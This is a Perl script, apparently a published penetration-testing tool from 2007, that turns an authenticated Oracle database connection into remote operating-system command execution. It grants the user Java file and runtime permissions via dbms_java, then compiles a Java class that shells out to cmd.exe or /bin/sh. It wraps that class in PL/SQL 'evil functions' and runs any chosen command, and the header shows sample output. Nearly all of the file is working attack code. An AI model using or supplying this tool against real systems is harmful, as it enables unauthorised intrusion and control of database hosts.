#!/usr/bin/perl
#
# Execute remote operating system commands from Oracle connection
#
# Author: 
#   Andrea "bunker" Purificato
#   http://www.purificato.org
#
# Updated on Wed Mar  7 10:24:58 CET 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
#
#
# $ perl ora_exec_cmd.pl -h 192.168.97.187 -s prova -u sfigato -p password -c 'dir c:\'
# [-] Setting permissions...
# [-] Creating Java class...
# [-] Creating function...
# [-] Creating procedure...
# [-] Exec: (dir c:\)
#  Volume in drive C is Stub
#  Volume Serial Number is 809D-4AC5
# 
#  Directory of c:\
# Process out:
# 2007-01-24  11.27             1 024 .rnd
# 2006-09-29  17.04                 0 AUTOEXEC.BAT
# 2006-09-29  17.04                 0 CONFIG.SYS
# 2006-11-14  10.05    <DIR>          cygwin
# 2006-09-29  17.10    <DIR>          Documents and Settings
# 2006-12-05  12.27               126 nessuswx.dbg
# 2007-02-07  17.06                 0 netstat.txt
# 2006-10-27  14.47    <DIR>          Oracle
# 2007-02-05  16.02    <DIR>          Program Files
# 2007-02-07  09.41    <DIR>          WINDOWS
# 2006-10-27  09.52    <DIR>          Xindice
#                6 File(s)          1 150 bytes
#                6 Dir(s)   7 859 896 320 bytes free
#
use warnings;
use strict;
use DBI;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> [-P <port>] [-b] -c '<command>'
Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     username
     -p     <passwd>   password 
     
    [-P     <port>     Oracle port]
    [-b		       bypass creation of evil functions]
     -c	    <command>  command
     
USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:c:P:b';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} or !$opt{c});

my $user = uc $opt{u};

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

$dbh->{RaiseError} = 1;
$dbh->func( 1000000, 'dbms_output_enable' );

unless($opt{b}) {
    print "[-] Setting permissions...\n";
    my $sth = $dbh->prepare("
    BEGIN
	dbms_java.grant_Permission('$user', 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
	dbms_java.grant_Permission('$user', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
	dbms_java.grant_Permission('$user', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
    END;
    ");
    $sth->execute;
    
    print "[-] Creating Java class...\n";
    $sth = $dbh->prepare('
    create or replace and compile java source named "Util" as
    import java.io.*;
    public class Util {
	public static void runthis(String command) {
	    try {
		String[] fCmd;
		if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
		    fCmd = new String[3];
		    fCmd[0] = "C:\\\\windows\\\\system32\\\\cmd.exe"; // XP/2003
		    //fCmd[0] = "C:\\\\winnt\\\\system32\\\\cmd.exe"; // NT/2000
		    fCmd[1] = "/c";
		    fCmd[2] = command;
		}
		else {
		    fCmd = new String[3];
		    fCmd[0] = "/bin/sh";
		    fCmd[1] = "-c";
		    fCmd[2] = command;
		}
		final Process pr = Runtime.getRuntime().exec(fCmd);
		pr.waitFor();
		new Thread(new Runnable(){
		    public void run() {
			BufferedReader br_in = null;
			try {
			    br_in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
			    String buff = null;
			    while ((buff = br_in.readLine()) != null) {
				System.out.println(buff);
				try {Thread.sleep(100); } catch(Exception e) {}
			    }
			    br_in.close();
			}
			catch (IOException ioe) {
			    System.out.println("Exception caught printing process output.");
			    ioe.printStackTrace();
			}
			finally { try { br_in.close(); } catch (Exception ex) {} }
		    }
		}).start();   
		new Thread(new Runnable(){
		    public void run() {
			BufferedReader br_err = null;
			try {
			    br_err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
			    String buff = null;
			    while ((buff = br_err.readLine()) != null) {
				System.out.println("Error: " + buff);
				try {Thread.sleep(100); } catch(Exception e) {}
			    }
			    br_err.close();
			}
			catch (IOException ioe) {
			    System.out.println("Exception caught printing process error.");
			    ioe.printStackTrace();
			}
			finally { try { br_err.close(); } catch (Exception ex) {} }
		    }
		}).start();
	    }
	    catch (Exception ex) {
		System.out.println(ex.getLocalizedMessage());
	    }
	}
    };
    ');
    $sth->execute;

    print "[-] Creating function...\n";
    $sth = $dbh->prepare(q{
    create or replace function run_cmd( p_cmd in varchar2) return number as
	language java 
	name 'Util.runthis(java.lang.String) return integer';
    });
    $sth->execute;

    print "[-] Creating procedure...\n";
    $dbh->do('
    create or replace procedure rc(p_cmd in varchar2) as
	x number;
    begin
	x := run_cmd(p_cmd);
    end;');
}

print "[-] Exec: ($opt{c})\n";
my $sth = $dbh->prepare(qq{
begin
    DBMS_JAVA.SET_OUTPUT(1000000);
    rc('$opt{c}');
end;
});
$sth->execute;

while (my $line = $dbh->func( 'dbms_output_get' )) { 
    print "$line\n"; 
}

$sth->finish;
$dbh->disconnect;
exit;
